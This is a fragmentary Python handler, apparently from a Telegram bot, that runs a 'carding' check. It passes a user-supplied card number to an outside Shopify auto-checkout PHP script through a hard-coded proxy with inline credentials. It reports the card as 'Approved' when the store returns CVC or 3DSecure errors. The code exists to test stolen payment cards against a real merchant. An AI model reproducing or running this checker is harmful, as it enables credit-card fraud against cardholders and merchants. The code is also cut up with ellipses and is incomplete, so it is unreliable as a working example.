...
import re,time
@Client.on_message(filters.command("shr" , prefixes=["/", "."]))
async def sa(client, message):
    user_id = message.from_user.id
    first_n = message.from_user.first_name
    mid = message.id

    if get_command_status('shr') == 'off':
...
'''
    ...
    ccc = None
    if len(message.text.split('shr ')) > 1 and message.text.split('shr ')[1].strip():
            ccc = message.text.split('shr ')[1].strip()
...
''', quote=True, disable_web_page_preview=True)
    ...
    site = 'https://catchflo.com/'
    url = f'https://ayanvbv.alwaysdata.net/ash/autosh.php?site={site}&cc={cccc}&proxy=38.179.19.57:6051:fgx504jtAB:33103780'
    try:
    ...
    if any(error_msg in msg for error_msg in [
        ...
        'INVALID_CVC',
        'INCORRECT_CVC',
        '3DSecure Authentication Required'
    ]):
        status = '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅'
    else:
        status = '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
    text = f'''
<b>#Auto_Shopify_Graphql (₹100.0) 🔥 [/shr]
- - - - - - - - - - - - - - - - - - - - - - - -</b>
